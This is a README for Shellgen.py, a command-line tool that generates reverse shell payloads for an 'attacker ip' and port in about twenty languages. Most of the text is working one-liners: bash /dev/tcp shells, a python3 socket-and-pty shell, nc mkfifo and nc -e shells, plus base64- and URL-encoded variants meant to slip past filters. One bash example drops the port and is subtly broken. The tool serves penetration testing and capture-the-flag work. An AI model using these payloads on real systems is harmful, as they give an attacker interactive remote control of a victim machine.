# Shellgen.py 
---

     (`-').->  (`-').->  (`-')  _                                 (`-')  _ <-. (`-')_ 
     ( OO)_    (OO )__   ( OO).-/    <-.       <-.        .->     ( OO).-/    \( OO) )
    (_)--\_)  ,--. ,'-' (,------.  ,--. )    ,--. )    ,---(`-') (,------. ,--./ ,--/ 
    /    _ /  |  | |  |  |  .---'  |  (`-')  |  (`-') '  .-(OO )  |  .---' |   \ |  | 
    \_..`--.  |  `-'  | (|  '--.   |  |OO )  |  |OO ) |  | .-, \ (|  '--.  |  . '|  |)
    .-._)   \ |  .-.  |  |  .--'  (|  '__ | (|  '__ | |  | '.(_/  |  .--'  |  |\    |  
    \       / |  | |  |  |  `---.  |     |'  |     |' |  '-'  |   |  `---. |  | \   | 
     `-----'  `--' `--'  `------'  `-----'   `-----'   `-----'    `------' `--'  `--'

---
## The tool is used to generate various types of reverse shell commands from the CLI.
## I got the idea for this tool from revshells.com and made a smaller CLI version
---
## The usage is very simple

    
    usage: shellgen.py [-h] [-i <attacker ip>] [-p <attacker port>] [-m method to use] [-l] [-b] [-u]

    optional arguments:
      -h, --help          show this help message and exit
      -i <attacker ip>    Attacker ip address to receive the connection back from victim machine. Default = 127.0.0.1
      -p <attacker port>  Attacker port to listen on. Default = 1337
      -m method to use    A comma seperated list of reverse shell methods. Default is bash,python3,nc
      -l                  List available methods for reverse shells
      -b                  Base64 encode the reverse shell output
      -u                  Url encode the reverse shell output


## Examples 
---
#### basic usage uses the three default methods, bash, python3, and nc default ip 127.0.0.1 and default port l337

    
    python3 shellgen.py 
    
    bash: 
      bash -i >& /dev/tcp/127.0.0.1/1337 0>&1 
      0<&196;exec 196<>/dev/tcp/127.0.0.1/1337; sh <&196 >&196 2>&196 
      /bin/bash -l > /dev/tcp/127.0.0.1/1337 0<&1 2>&1
    
    python3: 
      export RHOST="127.0.0.1";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'

#### specifying a method, ip, and port
    
    python3 shellgen.py -i 10.10.10.10 -m bash -p 9001

    bash: 
      bash -i >& /dev/tcp/10.10.10.10/9001 0>&1 
      0<&196;exec 196<>/dev/tcp/10.10.10.10; sh <&196 >&196 2>&196 
      /bin/bash -l > /dev/tcp/10.10.10.10/9001 0<&1 2>&1
                                                           
## Base64 encoded payload

    python3 shellgen.py -i 10.10.10.10 -p 9001 -b -m nc
    
    nc: 
       IHJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8YmFzaCAtaSAyPiYxfG5jIDEwLjEwLjEwLjEwIDkwMDEgPi90bXAvZiA= 

       IG5jIC1lIGJhc2ggMTAuMTAuMTAuMTAgOTAwMSA= 

       bmMuZXhlIC1lIGJhc2ggMTAuMTAuMTAuMTAgOTAwMSA= 

## Url encoded payload
    python3 shellgen.py -i 10.10.10.10 -p 9001 -u -m nc
    nc: 
       %20rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7Cbash%20-i%202%3E%261%7Cnc%2010.10.10.10%209001%20%3E/tmp/f%20 

       %20nc%20-e%20bash%2010.10.10.10%209001%20 

       nc.exe%20-e%20bash%2010.10.10.10%209001%20 

### ShellGen supports the following shell methods
- php
- bash
- nc
- c
- c#
- perl
- php-pentest-monkey
- powershell
- python
- python3
- ruby
- nodejs
- javascript
- groovy
- telnet
- zsh
- lua
- golang
- awk
- dart


## To do
- add option to save to file
